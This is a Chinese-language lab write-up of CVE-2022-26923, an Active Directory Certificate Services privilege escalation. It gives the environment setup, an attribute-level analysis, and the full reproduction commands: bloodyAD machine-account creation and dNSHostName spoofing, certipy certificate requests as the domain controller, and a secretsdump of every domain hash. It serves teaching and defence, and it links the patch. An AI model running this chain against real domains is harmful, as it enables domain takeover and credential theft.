## **漏洞概述**

当Windows系统的Active
Directory证书服务（CS）在域上运行时，由于机器账号中的dNSHostName属性不具有唯一性，域中普通用户可以将其更改为高权限的域控机器账号属性，然后从Active
Directory证书服务中获取域控机器账户的证书，导致域中普通用户权限提升为域管理员权限。这一漏洞最早由安全研究员Oliver
Lyak发现并公开分析过程和POC，微软在2022年5月的安全更新中对其进行了修补。

##  **影响范围**

影响范围较广，包括Win8.1、Win10、Win11、Win Server 2012 R2、Win Server 2016、Win Server
2019、Win Server 2022等版本，详细版本号可以参考微软官方的公告（参考链接）。

##  **复现环境**

操作系统：

Win10、Win Server 2016、Kali-linux-2022.1。

分析工具：

ADExplorer、Certipy、bloodyAD、impacket、PKINITtools。

##  **分析过程**

关于这个漏洞的分析和复现文章网上已经很多了，但是笔者在分析和复现这个漏洞时遇到的一些“坑”大多并未提及。所以，今天主要分享遇到的问题和解决方法。

首先设置Win Server
2016的IP地址为固定IP，然后设置其DNS服务器地址。测试时域控服务器的计算机名为dc，IP为192.168.220.160，网关为192.168.220.1

![](https://image.3001.net/images/20220607/1654581631_629ee97f0b1869dbcdeb1.png!small)接下来是安装域控环境。在Win
Server
2016安装域控环境比较简单，安装时，使用超级管理员Administrator登录，然后在服务管理器的仪表盘界面选择添加角色和功能，在弹出的向导中按照默认选项，直接“下一步”即可，注意在服务器角色界面中勾选“Active
Directory域服务”即可，如下图所示：

![](https://image.3001.net/images/20220607/1654581662_629ee99e737f689ab8efa.png!small)域服务安装完成后，选择“将此服务器提升为域控制器”，如下图所示：

![](https://image.3001.net/images/20220607/1654581688_629ee9b803d29aee43fec.png!small)然后选择“添加新林”指定根域名，笔者测试时设置的是：fenghuotai.local，如下图所示：

![](https://image.3001.net/images/20220607/1654581709_629ee9cdca45693bf4ee6.png!small)

其他的选项按照默认设置就可以了，另外，安装过程中会自动安装DNS服务器，安装成功后需要重启计算机。

最后是安装域证书服务。还是在服务管理器的仪表盘界面选择添加角色和功能，在弹出的向导中按照默认选项，直接“下一步”即可，注意在服务器角色界面中勾选“Active
Directory证书服务”即可，如下图所示：

![](https://image.3001.net/images/20220607/1654581736_629ee9e80aa71dd5f274e.png!small)然后在选择角色服务的步骤中，需要额外再选择“证书颁发机构Web注册”，如下图所示：

![](https://image.3001.net/images/20220607/1654581763_629eea03b61bf953e3f9c.png!small)域证书服务安装成功后，需要再配置域证书服务，如下图所示：

![](https://image.3001.net/images/20220607/1654581787_629eea1ba25140fc4a8f4.png!small)在配置域证书服务中，需要选择“证书颁发机构”和“证书颁发机构Web注册”，如下图所示：

![](https://image.3001.net/images/20220607/1654581806_629eea2ec8cab83d3cc66.png!small)

最后再选择“企业证书”（如果不是域成员，无法选择该选项，但默认账号Administrator可以），如下图所示：

![](https://image.3001.net/images/20220607/1654581825_629eea41d356b9aca3887.png!small)

其他选项按照默认设置即可。

域控服务和域证书服务安装成功后，在服务管理器的仪表盘的工具菜单中选择“Active
Directory管理中心”，然后在Users分组下新建一个用户账号，输入密码和选择“密码永不过期”，模拟加入域环境的普通用户账号。分析时使用的普通用户账号是testcve，如下图所示：

![](https://image.3001.net/images/20220607/1654581849_629eea5908ed4ab967712.png!small)

域普通用户账号建立好后，再选择另外一台计算机，测试时使用的是64位的
Win10系统，计算机名为testmachine，加入刚建立的域fenghuotai.local，然后使用刚建立的域普通用户账号testcve登录（加入域的方法请自行搜索，此步骤无特殊设置）。到此，测试环境就搭建好了。

以域普通用户账号testcve登录Win10计算机后，使用ADExplorer工具分析该提权漏洞产生的原因。

ADExplorer工具需要先登录，分析时使用普通域用户账号testcve登录fenghuotai.local域，如下图所示：

![](https://image.3001.net/images/20220607/1654581866_629eea6ada7d1d45f5ffe.png!small)

登录成功后，展开左边的树形控件“DC=fenghuotai,DC=local”，然后再展开“CN=Computers”和“CN=Users”，可以分别看到刚才新加入域的名为CN=TESTMACHINE的win10计算机机器账号和普通域用户账号CN=testcve，这两个账号均包含了很多属性值，如下图所示：

![](https://image.3001.net/images/20220607/1654581889_629eea8149a9e2b432170.png!small)

每个属性的具体含义可以参考微软官方的帮助文档，此次分析只关注该漏洞相关的属性。默认情况下，域用户账号可以申请User证书，域计算机机器账号可以申请Machine证书，两个证书都允许客戶端身份验证。

展开Computers分组，选中刚才加入域的计算机CN=TESTMACHINE，其中一项属性dNSHostName的内容为testmachine.fenghuotai.local，testmachine就是新加入域的Win10计算机的计算机名，这个属性是向域证书服务申请机器账号证书时用于标识指定计算机机器账号的，也就是说dNSHostName的内容和机器证书是绑定的，不同机器账号的dNSHostName内容，就会得到不同的证书。另外属性sAMAccountName的内容为TESTMACHINE$，这个属性作为计算机机器账号名，如下图所示：

![](https://image.3001.net/images/20220607/1654581907_629eea93179ddba9f9d2e.png!small)那么可以将dNSHostName的内容改为域控服务器的内容吗？如果可以的话，岂不是就伪造成域控服务器的机器账号了吗？尝试将其内容改为dc.fenghuotai.local，却会得到一个错误，更改失败，如下图所示：

![](https://image.3001.net/images/20220607/1654581925_629eeaa59e0137a7d72f0.png!small)为什么会出现这个错误？因为dNSHostName属性和另外一个servicePrincipalName属性是相关联的，更改dNSHostName属性后，域控服务器将自动更新servicePrincipalName属性的值。这样就导致和原域控服务器机器账号的servicePrincipalName属性冲突了。TESTMACHINE$机器账号属性servicePrincipalName中的内容，如下图所示：

![](https://image.3001.net/images/20220607/1654581944_629eeab8d6c209feabedf.png!small)

但是如果删除了其servicePrincipalName属性中的两项内容RestrictedKrbHost/testmachine.fenghuotai.local和HOST/testmachine.fenghuotai.local，更改dNSHostName属性的内容为dc.fenghuotai.local，不会导致冲突，更改将会成功。

属性servicePrincipalName中删除了两项后的内容，如下图所示：

![](https://image.3001.net/images/20220607/1654581962_629eeacad182cd547256e.png!small)

但是如果删除了其servicePrincipalName属性中的两项内容RestrictedKrbHost/testmachine.fenghuotai.local和HOST/testmachine.fenghuotai.local，更改dNSHostName属性的内容为dc.fenghuotai.local，不会导致冲突，更改将会成功。

属性servicePrincipalName中删除了两项后的内容，如下图所示：

![](https://image.3001.net/images/20220607/1654581979_629eeadbad69b952e9f98.png!small)dNSHostName属性的内容成功更改为域控服务器的内容dc.fenghuotai.local，如下图所示：

![](https://image.3001.net/images/20220607/1654581996_629eeaec6f6dd74335885.png!small)

到此，普通机器账号TESTMACHINE$成功伪造成了域控机器账号dc$，然后从Active
Directory证书服务中申请到域控机器账户的证书，导致域中普通用户权限提升为域管理员权限。

##  **利用场景**

根据该漏洞的分析结果，想要成功利用该漏洞，需要满足如下几个条件：

 **1、域控服务器系统版本**

Win8.1、Win10、Win11、Win Server 2012 R2、Win Server 2016、Win Server 2019、Win
Server 2022等版本，详细版本号可以参考微软官方的公告（参考链接）。

 **2、域内普通用户账号权限**

需要获取域内至少一个普通用户账号权限，并且需要该账户对dNSHostName等属性具有相应的权限。默认情况，普通用户账号具有该权限。

 **3、企业证书服务**

域内部署有企业证书服务，并允许被控制的计算机账户申请计算机身份验证证书。

##  **复现过程**

环境搭建过程不再赘述，参照分析过程即可，攻击机选择Kali-linux-2022.1，需要安装额外的工具Certipy、bloodyAD、impacket、PKINITtools，工具安装下载链接在参考链接中，按照官方安装说明安装即可。

首先需要获取域控服务器，域证书服务器的一些基本信息。在受控的主机上执行powershell命令Get-ChildItem
Cert:\LocalMachine\Root\，得到域证书服务器地址fenghuotai-DC-CA，域控服务器地址fenghuotai.local，域控计算机名为dc，如下图所示：

![](https://image.3001.net/images/20220607/1654582043_629eeb1b7a38ffb2b493a.png!small)设置攻击机的DNS服务器地址为域控DNS服务器地址，或者在本地hosts文件中设置域控和与证书服务器域名的ip，不然会导致无法解析域名等错误。设置kali的hosts文件内容，如下图所示：

![](https://image.3001.net/images/20220607/1654582064_629eeb30c0e790d46d071.png!small)复现环境准备好后，先使用掌握的域内普通用户账号申请证书，并验证登录，测试复现环境是否异常。申请证书命令certipy
req 'fenghuotai.local/testcve:1qaz3edc.@dc.fenghuotai.local' -ca fenghuotai-DC-CA -template
User![](https://image.3001.net/images/20220607/1654582121_629eeb69a6e73a6de935d.png!small)

可能会遇到NETBIOS超时现象，重新执行一次申请证书命令即可。

申请用户账号证书成功后，执行命令certipy auth -pfx testcve.pfx验证该证书，获取其NT hash，如下图所示：

![](https://image.3001.net/images/20220607/1654582141_629eeb7dd3b9b33a4d990.png!small)

成功获取到了NT
hash，说明测试环境没问题。如果遇到错误（特别是还原域控虚拟机后），说明域控有些服务没正确启动。需要重启域控服务器，待仪表板上的服务项启动后，或者手动启动后，再重启Kerberos
Key Distribution Center（kdc）服务。不知道实战中是否会遇到该错误，如果遇到了，后面的利用就无法进行了。

使用命令python bloodyAD.py -d fenghuotai.local -u testcve -p '1qaz3edc.' --host
192.168.220.160 addComputer pwnmachine
'CVEPassword1234*'，新建一台名为pwnmachine，密码为CVEPassword1234*的机器账号，如下图所示：

![](https://image.3001.net/images/20220607/1654582169_629eeb9929581bc26db12.png!small)然后使用命令python
bloodyAD.py -d fenghuotai.local -u testcve -p '1qaz3edc.' --host
192.168.220.160 setAttribute
'CN=pwnmachine,CN=Computers,DC=fenghuotai,DC=local' dNSHostName
'["dc.fenghuotai.local"]'，设置其dNSHostName 属性为域控服务器属性，如下图所示：

![](https://image.3001.net/images/20220607/1654582186_629eebaa63c95be949e53.png!small)设置成功后使用命令certipy
req 'fenghuotai.local/pwnmachine$:CVEPassword1234*@192.168.220.160' -template
Machine -dc-ip 192.168.220.160 -ca fenghuotai-DC-CA，申请新建的机器账号pwnmachine$的证书，其实申请到的是域控dc$的证书，如下图所示：

![](https://image.3001.net/images/20220607/1654582205_629eebbd4ec912b8eb58c.png!small)获取到域控的机器账号证书后，使用命令certipy
auth -pfx ./dc.pfx -dc-ip 192.168.220.160进行登录验证，获取其NT hash，如下图所示：

![](https://image.3001.net/images/20220607/1654582223_629eebcf5dea0963d7362.png!small)然后使用impacket工具examples目录下的secretsdump.py脚本，命令为python3
secretsdump.py 'fenghuotai.local/dc$@dc.fenghuotai.local' -hashes
:d396bce5a7bf19ed7bfa58b8f923357a，获取域内所有账号hash，如下图所示：

![](https://image.3001.net/images/20220607/1654582242_629eebe2668dcca95aa46.png!small)当然，还可以使用PKINITtools工具，获取域控最高权限shell，这部分就交给读者自己完成。

##  **补丁链接**

<https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923>

##  **参考链接**

  * <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923>
  * <https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4>
  * [https://mp.weixin.qq.com/s?src=11&amptimestamp=1654133733&ver=3835&signature=VTP8C0A7M8aZFsS74thaDmY9QflFz22HsaJfXR70bOIYyyx6bL*Obj77ZSVyJ*zfdw2AiA4W-VfZmcYvn0c-Zxh2prrCryHB4FW23wBLUotQFbvPq8K1Fwfl6iMsQLvR&new=1](https://mp.weixin.qq.com/s?src=11×tamp=1654133733&ver=3835&signature=VTP8C0A7M8aZFsS74thaDmY9QflFz22HsaJfXR70bOIYyyx6bL*Obj77ZSVyJ*zfdw2AiA4W-VfZmcYvn0c-Zxh2prrCryHB4FW23wBLUotQFbvPq8K1Fwfl6iMsQLvR&new=1)
  * <https://github.com/ly4k/Certipy>
  * <https://github.com/CravateRouge/bloodyAD>
  * <https://github.com/SecureAuthCorp/impacket>
  * <https://github.com/dirkjanm/PKINITtools>

